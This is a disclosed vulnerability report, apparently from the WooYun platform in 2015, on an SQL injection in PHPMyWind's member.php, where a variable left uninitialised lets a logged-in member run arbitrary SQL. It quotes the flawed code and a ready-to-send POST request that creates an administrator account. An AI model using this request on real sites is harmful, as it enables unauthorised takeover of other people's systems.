{"id": 30268, "wybug_id": "wooyun-2015-0117008", "wybug_title": "PHPMyWind一个为所欲为的注入", "wybug_corp": "phpmywind.com", "wybug_author": "路人曱", "wybug_date": "2015-06-01 12:59", "wybug_open_date": "2015-09-04 13:00", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-06：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-07-31：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-04：\t细节向公众公开  简要描述： rt 详细说明：  PHPMyWind最新版只需会员登录 即可进行任意sql操作漏洞代码:/member.php861-941行\nelse if($a == 'perfect'){\t//初始化参数\t$username   = empty($username)   ? '' : $username;\t$password   = empty($password)   ? '' : md5(md5($password));\t$repassword = empty($repassword) ? '' : md5(md5($repassword));\t$email      = empty($email)      ? '' : $email;\t//验证输入数据\tif($username == '' or\t   $password == '' or\t   $repassword == '' or\t   $email == '')\t{\t\theader('location:?c=perfect');\t\texit();\t}\tif($password != $repassword)\t{\t\theader('location:?c=perfect');\t\texit();\t}    $uname_len = strlen($username);\t$upwd_len  = strlen($_POST['password']);\tif($uname_len<6 or $uname_len>16 or $upwd_len<6 or $upwd_len>16)\t{\t\theader('location:?c=perfect');\t\texit();\t}\tif(preg_match(\"/[^0-9a-zA-Z_@!\\.-]/\",$username) or\t   preg_match(\"/[^0-9a-zA-Z_-]/\",$password) or\t   !preg_match(\"/^[\\w-]+(\\.[\\w-]+)*@[\\w-]+(\\.[\\w-]+)+$/\", $email))\t{\t\theader('location:?c=perfect');\t\texit();\t}\t$r = $dosql->GetOne(\"SELECT `id` FROM `#@__member` WHERE `username`='$username'\");\tif(isset($r['id']))\t{\t\tShowMsg('用户名已存在！','-1');\t\texit();\t}\t$r = $dosql->GetOne(\"SELECT `id` FROM `#@__member` WHERE `email`='$email'\");\tif(isset($r['id']))\t{\t\tShowMsg('您填写的邮箱已被注册！','-1');\t\texit();\t}\t//添加用户数据\t$regtime  = time();\t$regip    = GetIP();\t\tif(check_app_login('qq'))\t{\t\t$r = $dosql->GetOne(\"SELECT `id` FROM `#@__member` WHERE `qqid`='\".$_SESSION['app']['qq']['uid'].\"'\");\t\tif(isset($r['id']))\t\t\tShowMsg('该QQ已与其他账号绑定！','-1');\t\telse\t\t\t$sql = \"INSERT INTO `#@__member` (username, password, email, expval, regtime, regip, logintime, loginip, qqid) VALUES ('$username', '$password', '$email', '10', '$regtime', '$regip', '$regtime', '$regip', '\".$_SESSION['app']['qq']['uid'].\"')\";\t\t}\telse if(check_app_login('weibo'))\t{\t\t$r = $dosql->GetOne(\"SELECT `id` FROM `#@__member` WHERE `qqid`='\".$_SESSION['app']['weibo']['idstr'].\"'\");\t\tif(isset($r['id']))\t\t\tShowMsg('该微博已与其他账号绑定！','-1');\t\telse\t\t\t$sql = \"INSERT INTO `#@__member` (username, password, email, expval, regtime, regip, logintime, loginip, weiboid) VALUES ('$username', '$password', '$email', '10', '$regtime', '$regip', '$regtime', '$regip', '\".$_SESSION['app']['weibo']['idstr'].\"')\";\t\t}\t\t$dosql->ExecNoneQuery($sql);\n主要代码\nif(check_app_login('qq'))\t{\t\t$r = $dosql->GetOne(\"SELECT `id` FROM `#@__member` WHERE `qqid`='\".$_SESSION['app']['qq']['uid'].\"'\");\t\tif(isset($r['id']))\t\t\tShowMsg('该QQ已与其他账号绑定！','-1');\t\telse\t\t\t$sql = \"INSERT INTO `#@__member` (username, password, email, expval, regtime, regip, logintime, loginip, qqid) VALUES ('$username', '$password', '$email', '10', '$regtime', '$regip', '$regtime', '$regip', '\".$_SESSION['app']['qq']['uid'].\"')\";\t\t}\telse if(check_app_login('weibo'))\t{\t\t$r = $dosql->GetOne(\"SELECT `id` FROM `#@__member` WHERE `qqid`='\".$_SESSION['app']['weibo']['idstr'].\"'\");\t\tif(isset($r['id']))\t\t\tShowMsg('该微博已与其他账号绑定！','-1');\t\telse\t\t\t$sql = \"INSERT INTO `#@__member` (username, password, email, expval, regtime, regip, logintime, loginip, weiboid) VALUES ('$username', '$password', '$email', '10', '$regtime', '$regip', '$regtime', '$regip', '\".$_SESSION['app']['weibo']['idstr'].\"')\";\t\t}\t\t$dosql->ExecNoneQuery($sql);\n$sql 在if else if中才赋值只需不进入2个条件即可  最后执行  很简单 完全操控所以语句   漏洞证明：  利用起来也很简单 注册个用户登录后发个如下的包即可POST /phpmywind/member.php?a=perfectDATA username=123123123x&password=123123123&repassword=123123123&email=12312@qq.com&sql=xxxxxusername email 不是注册过的就行 随便乱填\n\n\n\nsql改成 insert into pmw_admin (`username`,`password`) values ((123456),md5(123456))即可创建一个 123456 密码123456的管理员账户   修复方案：  初始化   版权声明：转载请注明来源 路人曱@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-09-04 13:00 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}